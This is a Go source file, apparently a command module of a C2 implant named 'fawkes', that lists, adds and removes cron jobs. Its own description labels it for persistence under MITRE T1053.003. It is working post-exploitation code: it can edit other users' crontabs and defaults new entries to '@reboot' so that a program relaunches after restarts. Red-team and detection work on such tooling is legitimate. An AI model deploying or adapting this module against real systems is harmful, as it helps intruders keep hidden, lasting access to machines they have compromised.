//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

type CrontabCommand struct{}

func (c *CrontabCommand) Name() string {
	return "crontab"
}

func (c *CrontabCommand) Description() string {
	return "List, add, or remove cron jobs for persistence (T1053.003)"
}

type crontabArgs struct {
	Action  string `json:"action"`
	Entry   string `json:"entry"`
	User    string `json:"user"`
	Program string `json:"program"`
	Args    string `json:"args"`
	Schedule string `json:"schedule"`
}

func (c *CrontabCommand) Execute(task structs.Task) structs.CommandResult {
	var args crontabArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use action: list, add, remove",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return crontabList(args)
	case "add":
		return crontabAdd(args)
	case "remove":
		return crontabRemove(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list, add, remove", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// crontabList lists current cron jobs
func crontabList(args crontabArgs) structs.CommandResult {
	cmdArgs := []string{"-l"}
	if args.User != "" {
		cmdArgs = []string{"-u", args.User, "-l"}
	}

	out, err := exec.Command("crontab", cmdArgs...).CombinedOutput()
	if err != nil {
		output := strings.TrimSpace(string(out))
		// "no crontab for user" is not an error
		if strings.Contains(output, "no crontab") {
			return structs.CommandResult{
				Output:    output,
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error listing crontab: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	output := strings.TrimSpace(string(out))
	if output == "" {
		output = "(empty crontab)"
	}

	header := "Current crontab"
	if args.User != "" {
		header += fmt.Sprintf(" for user %s", args.User)
	}
	return structs.CommandResult{
		Output:    fmt.Sprintf("%s:\n%s", header, output),
		Status:    "success",
		Completed: true,
	}
}

// crontabAdd adds a cron job entry
func crontabAdd(args crontabArgs) structs.CommandResult {
	var entry string

	if args.Entry != "" {
		// Use raw entry (e.g., "*/5 * * * * /path/to/command")
		entry = args.Entry
	} else if args.Program != "" {
		// Build entry from schedule + program + args
		schedule := args.Schedule
		if schedule == "" {
			schedule = "@reboot" // Default to persistence on reboot
		}
		if args.Args != "" {
			entry = fmt.Sprintf("%s %s %s", schedule, args.Program, args.Args)
		} else {
			entry = fmt.Sprintf("%s %s", schedule, args.Program)
		}
	} else {
		return structs.CommandResult{
			Output:    "Error: provide either 'entry' (raw cron line) or 'program' (with optional schedule/args)",
			Status:    "error",
			Completed: true,
		}
	}

	// Get existing crontab
	cmdArgs := []string{"-l"}
	if args.User != "" {
		cmdArgs = []string{"-u", args.User, "-l"}
	}

	existing, err := exec.Command("crontab", cmdArgs...).Output()
	if err != nil {
		existing = []byte{} // No existing crontab is fine
	}

	// Append new entry
	newCrontab := strings.TrimRight(string(existing), "\n")
	if newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += entry + "\n"

	// Write new crontab
	installArgs := []string{"-"}
	if args.User != "" {
		installArgs = []string{"-u", args.User, "-"}
	}
	cmd := exec.Command("crontab", installArgs...)
	cmd.Stdin = strings.NewReader(newCrontab)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error installing crontab: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Added cron entry:\n  %s", entry),
		Status:    "success",
		Completed: true,
	}
}

// crontabRemove removes a cron job entry by matching text
func crontabRemove(args crontabArgs) structs.CommandResult {
	if args.Entry == "" && args.Program == "" {
		return structs.CommandResult{
			Output:    "Error: provide 'entry' (exact line) or 'program' (path substring) to identify which entry to remove",
			Status:    "error",
			Completed: true,
		}
	}

	// Get existing crontab
	cmdArgs := []string{"-l"}
	if args.User != "" {
		cmdArgs = []string{"-u", args.User, "-l"}
	}

	existing, err := exec.Command("crontab", cmdArgs...).Output()
	if err != nil {
		return structs.CommandResult{
			Output:    "Error: no crontab exists to remove entries from",
			Status:    "error",
			Completed: true,
		}
	}

	// Filter out matching lines
	matchStr := args.Entry
	if matchStr == "" {
		matchStr = args.Program
	}

	lines := strings.Split(string(existing), "\n")
	var kept []string
	removedCount := 0
	for _, line := range lines {
		if strings.Contains(line, matchStr) {
			removedCount++
			continue
		}
		kept = append(kept, line)
	}

	if removedCount == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No cron entries matching '%s' found", matchStr),
			Status:    "error",
			Completed: true,
		}
	}

	// Install updated crontab
	newCrontab := strings.Join(kept, "\n")
	installArgs := []string{"-"}
	if args.User != "" {
		installArgs = []string{"-u", args.User, "-"}
	}
	cmd := exec.Command("crontab", installArgs...)
	cmd.Stdin = strings.NewReader(newCrontab)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error installing updated crontab: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d cron entry(ies) matching '%s'", removedCount, matchStr),
		Status:    "success",
		Completed: true,
	}
}
